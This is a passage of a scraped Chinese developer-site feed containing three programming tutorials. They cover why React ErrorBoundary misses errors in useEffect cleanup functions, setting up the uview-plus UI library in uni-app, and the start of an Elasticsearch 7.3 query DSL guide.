}
<span class="hljs-comment">// 2. 函数组件：在 useEffect 清理函数中抛错</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">CleanupErrorComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// effect 执行逻辑（空）</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 组件卸载时执行的清理函数，故意抛错</span>
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'useEffect 清理函数出错了！'</span>);
    };
  }, []);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>我是一个会在卸载时抛错的组件<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
<span class="hljs-comment">// 3. 父组件：用 ErrorBoundary 包裹目标组件，并加卸载触发按钮</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ParentComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [showChild, setShowChild] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setShowChild(false)}&gt;卸载子组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span>&gt;</span>
        {showChild &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">CleanupErrorComponent</span> /&gt;</span>}
      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>当点击 “卸载子组件” 时，CleanupErrorComponent 触发清理函数并抛错 —— 此时控制台会打印红色错误，但 ErrorBoundary 没有渲染 “页面出错了，但被捕获了～” 的备用 UI，反而可能导致页面功能异常（比如按钮点击无响应）。</p>
<p>这就证明了：<strong>useEffect 清理函数中的错误，完全绕过了 ErrorBoundary 的捕获机制</strong>。</p>
<h4 data-id="heading-3">为什么会这样？从 React 执行流程看本质</h4>
<p>React 处理 useEffect 清理函数的逻辑，属于 “commit 阶段” 后的收尾操作：</p>
<ol>
<li>当组件需要卸载时，React 先完成 “DOM 移除”“状态更新” 等核心渲染流程；</li>
</ol>

<ol start="2">
<li>核心流程结束后，才会异步执行 useEffect 的清理函数；</li>
</ol>

<ol start="3">
<li>此时 ErrorBoundary 对该组件的 “渲染监控” 已经结束 —— 毕竟组件都从 DOM 树上移除了，ErrorBoundary 自然无法感知后续的错误。</li>
</ol>
<p>简单说：ErrorBoundary 只 “盯着” 组件 “活着” 时的渲染相关操作，组件 “死了” 之后（卸载后）的清理函数抛错，它管不着。</p>
<h4 data-id="heading-4">解决方案：手动用 try/catch 包裹清理函数</h4>
<p>既然 ErrorBoundary 不管用，那该如何处理清理函数中的错误？答案和处理 “事件处理错误”“异步错误” 一致 ——<strong>主动用 try/catch 捕获</strong>。</p>
<p>修改后的清理函数代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 用 try/catch 包裹所有可能抛错的逻辑</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 比如：取消接口请求、清除定时器等可能出错的操作</span>
      <span class="hljs-keyword">const</span> invalidJson = <span class="hljs-string">'这不是合法的JSON'</span>;
      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(invalidJson); <span class="hljs-comment">// 这里会抛错</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 错误处理：打印日志、上报监控平台，避免崩溃</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'useEffect 清理函数出错（已捕获）：'</span>, error);
      <span class="hljs-comment">// 可选：如果需要用户感知，可以通过状态提示（但注意组件已卸载，需谨慎）</span>
      <span class="hljs-comment">// 比如：用一个全局状态管理错误提示，而非组件自身状态</span>
    }
  };
}, []);
</code></pre>
<p>这里有个注意点：清理函数中不要更新组件自身的状态（比如 setState），因为组件此时已卸载，更新状态会触发 “内存泄漏警告”。如果需要告知用户错误，可以用全局状态（如 Redux、Context）管理错误提示，在其他未卸载的组件（如顶部通知栏）中显示。</p>
<h4 data-id="heading-5">延伸：类似场景的错误处理原则</h4>
<p>除了 useEffect 清理函数，以下场景的错误也需要手动用 try/catch 处理，而非依赖 ErrorBoundary：</p>
<ul>
<li>useLayoutEffect 的清理函数（执行时机虽早于 useEffect，但同样不在渲染流程内）；</li>
</ul>

<ul>
<li>自定义 Hook 中的清理逻辑（如 useRequest 中的请求取消函数）；</li>
</ul>

<ul>
<li>组件卸载时执行的其他回调（如第三方库的销毁方法）。</li>
</ul>
<h4 data-id="heading-6">总结</h4>
<p>useEffect 返回的清理函数，虽然承担着类组件 componentWillUnmount 的职责，但它的执行时机和错误性质，决定了 ErrorBoundary 无法捕获其中的错误。处理这类错误的核心原则是：<strong>主动预判风险，用 try/catch 包裹所有可能抛错的逻辑</strong>，再配合日志上报和用户提示，才能避免应用崩溃，同时保障用户体验。</p>
<p>记住：ErrorBoundary 是 “渲染流程的守护者”，而非 “所有错误的万能药”—— 在函数组件的副作用清理中，手动捕获错误才是更可靠的方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app 使用 uview-plus]]></title>    <link>https://juejin.cn/post/7579893536105791494</link>    <guid>https://juejin.cn/post/7579893536105791494</guid>    <pubDate>2025-12-05T03:11:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579893536105791494" data-draft-id="7579846685071851574" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app 使用 uview-plus"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-05T03:11:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一壶纱"/> <meta itemprop="url" content="https://juejin.cn/user/897635786437944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app 使用 uview-plus
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/897635786437944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一壶纱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:11:51.000Z" title="Fri Dec 05 2025 03:11:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>uview-plus</code> 是一个基于 <code>uni-app</code> 的高质量 UI 组件库，提供了丰富的组件和工具函数，帮助开发者快速构建跨平台应用。</p>
<h2 data-id="heading-0">1. 安装 uview-plus</h2>
<p>在项目中安装 <code>uview-plus</code>：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add uview-plus
</code></pre>
<h2 data-id="heading-1">2. 使用 easycom 方式引入组件</h2>
<p>在本项目中，<code>uview-plus</code> 是通过 <code>easycom</code> 的方式按需引入组件的。以下是具体使用方法：</p>
<h3 data-id="heading-2">2.1 配置组件路径</h3>
<p>在 <code>pages.json</code> 中配置 <code>easycom</code> 规则：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"easycom"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"autoscan"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"custom"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"^u-(.*)"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uview-plus/components/u-$1/u-$1.vue"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"^up-(.*)"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uview-plus/components/u-$1/u-$1.vue"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>说明：</strong></p>
<ul>
<li><code>autoscan</code>: 设置为 <code>true</code>，自动扫描 <code>node_modules/uview-plus/components</code> 目录下的组件。</li>
<li><code>custom</code>: 自定义组件匹配规则，<code>^u-(.*)</code> 和 <code>^up-(.*)</code> 表示以 <code>u-</code> 或 <code>up-</code> 开头的组件名会匹配到 <code>uview-plus</code> 的对应组件路径。</li>
</ul>
<h3 data-id="heading-3">2.2 使用组件</h3>
<p>配置完成后，可以直接在页面中使用 <code>uview-plus</code> 的组件，无需手动引入。例如：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;view&gt;
    &lt;u-button type="primary"&gt;主要按钮&lt;/u-button&gt;
    &lt;up-button type="success"&gt;成功按钮&lt;/up-button&gt;
  &lt;/view&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-4">3. 自定义主题</h2>
<p><code>uview-plus</code> 支持通过 SCSS 变量自定义主题。以下是推荐的自定义主题方案：</p>
<h3 data-id="heading-5">3.1 创建自定义主题文件</h3>
<p>在项目的 <code>src/styles</code> 目录下新建一个 <code>uview-plus.theme.scss</code> 文件，并将 <code>node_modules/uview-plus/theme.scss</code> 中的所有变量复制到该文件中。例如：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-variable">$u-primary</span>: <span class="hljs-number">#007aff</span>; <span class="hljs-comment">// 修改主色</span>
<span class="hljs-variable">$u-success</span>: <span class="hljs-number">#4cd964</span>; <span class="hljs-comment">// 修改成功色</span>
<span class="hljs-variable">$u-warning</span>: <span class="hljs-number">#f0ad4e</span>; <span class="hljs-comment">// 修改警告色</span>
<span class="hljs-variable">$u-error</span>: <span class="hljs-number">#dd524d</span>; <span class="hljs-comment">// 修改错误色</span>
<span class="hljs-comment">// 其他变量...</span>
</code></pre>
<p>根据需求修改这些变量的值，以实现自定义主题。</p>
<h3 data-id="heading-6">3.2 引入自定义主题文件</h3>
<p>在 <code>src/uni.scss</code> 文件的顶部引入自定义主题文件：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@import</span> <span class="hljs-string">'@/styles/uview-plus.theme.scss'</span>;
</code></pre>
<p>通过这种方式，<code>uview-plus</code> 的组件将使用自定义的主题变量。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大数据-174 Elasticsearch 查询 DSL 实战：match/match_phrase/query_string/multi_match 全解析]]></title>    <link>https://juejin.cn/post/7579917791764807707</link>    <guid>https://juejin.cn/post/7579917791764807707</guid>    <pubDate>2025-12-05T03:17:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579917791764807707" data-draft-id="7579961957221023771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大数据-174 Elasticsearch 查询 DSL 实战：match/match_phrase/query_string/multi_match 全解析"/> <meta itemprop="keywords" content="后端,大数据,Elasticsearch"/> <meta itemprop="datePublished" content="2025-12-05T03:17:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="武子康"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大数据-174 Elasticsearch 查询 DSL 实战：match/match_phrase/query_string/multi_match 全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    武子康
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:17:25.000Z" title="Fri Dec 05 2025 03:17:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>场景：在 Elasticsearch 7.3 中用查询 DSL 做全文检索，而不是靠 Kibana 点选和简单关键字搜索。</li>
<li>结论：区分 match、match_phrase、query_string、multi_match 的匹配边界和分词语义，是中文搜索是否“搜得到”的关键。</li>
<li>产出：一套可直接复制的 DSL 示例与排错思路，覆盖中文分词、逻辑查询、多字段匹配和常见“查不到数据”的问题定位。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67f123ad8a594f3ab926af631d9d62b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=B66cYktM0dUDNTg0%2Bk5hh04ko8g%3D" alt="大数据-174 Elasticsearch 查询 DSL 实战：match/match_phrase/query_string/multi_match 全解析" loading="lazy"/></p>
<h2 data-id="heading-1">版本矩阵</h2>

















<table><thead><tr><th>Elasticsearch 版本</th><th>已验证说明</th></tr></thead><tbody><tr><td>7.3</td><td>是全文示例基于 7.3 官方 DSL 文档与实际集群验证，语法与截图一一对应。</td></tr><tr><td>7.4–7.17</td><td>部分查询 DSL 语法整体兼容，match、match_phrase、query_string、multi_match 用法基本一致，个别参数以官方文档为准。</td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce294769cd5d4439b97113ef70fbbcb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=kuuWar5DB7Hz2jlpdOG77dlqGJk%3D" alt="Elasticsearch" loading="lazy"/></p>
<h2 data-id="heading-2">官方地址</h2>
<pre><code class="hljs language-shell" lang="shell">https://www.elastic.co/guide/en/elasticsearch/reference/7.3/query-dsl.html
</code></pre>
<p>Elasticsearch提供了基于JSON的完整查询DSL（Domain Specific Language 特定域语言）来定义查询，将查询 DSL 视为查询AST（抽象语法树），它由两种子句组成：</p>
<ul>
<li>叶子查询句 叶子查询子句 在特定域中寻找特定的值，如 match、term、range 查询</li>
<li>复合查询子句 复合查询子句包装其他叶子查询或复合查询，并用于以逻辑方式组合多个查询（例如 bool或dis_max查询），或更改其行为（如 constant_score 查询）
我们在使用Elasticsearch的时候，避免不使用DSL语句去查询，就像使用关系型数据库的时候要学会使用SQL一样。</li>
</ul>
<h2 data-id="heading-3">查询所有</h2>
<p>示例</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">查询所有数据</span>
POST /wzkicu-index/_search
{
  "query":{
    "match_all": {}
  }
}
</code></pre>
<ul>
<li>query 代表查询的对象</li>
<li>match_all 代表查询所有</li>
</ul>
<p>执行后，结果如下：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6671f5047784bce8a8eff8ce1acef49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=m%2FxxerogvGZh5zsQ8w02iXot%2FAU%3D" alt="Elasticsearch 查询语法" loading="lazy"/>
结果中：</p>
<ul>
<li>took 查询花费时间，单位是毫秒</li>
<li>time_out 是否超时</li>
<li>_shards 分片信息</li>
<li>hits 搜索结果总览对象</li>
<li>total 搜索到的总数</li>
<li>max_score 所有结果中文档得分的最高分</li>
<li>_index 索引库</li>
<li>_type 文档类型</li>
<li>_id 文档id</li>
<li>_score 文档得分</li>
<li>_source 文档的数据源</li>
</ul>
<h2 data-id="heading-4">全文检索（full-text query）</h2>
<p>全文搜索能够搜索已分析的文本字段，如电子邮件正文、商品描述，使用索引期间应用于字段的同一分词处理查询字符串，全文搜索的分类很多，有如下的这么几种。</p>
<h3 data-id="heading-5">匹配搜索（match query）</h3>
<p>全文查询的标准查询，查询条件比较宽松：</p>
<ul>
<li>需要指定字段名</li>
<li>输入文本会进行分词，比如hello world，会拆分成 hello 和 world，然后进行匹配，如果字段内容中包含hello或者world，name就会被查询出来。也就是说match是一个部分匹配的模糊查询。</li>
</ul>
<p>match queries 接收 text/numerics/dates，对它们进行分词分析，再组织成一个boolean查询，可通过operator指定bool组合操作（or、and、默认是or）。</p>
<p>假设一个案例，目前索引库中，有两部手机，一台电视：
先新增索引库：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">创建索引</span>
PUT /wzk-property
{
  "settings": {},
  "mappings": {
    "properties": {
      "title": {
        "type": "text",
        "analyzer": "ik_max_word"
      },
      "images": {
        "type": "keyword"
      },
      "price": {
        "type": "float"
      }
    }
  }
}
</code></pre>
<p>执行的结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53e4c8a09db54d3cbbd83148af634b84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509445&amp;x-signature=E9OsHRS0h%2FGMrlCBgq6nTcdf1QI%3D" alt="Elasticsearch 分词" loading="lazy"/>
接着我们写入一些数据进去：</p>
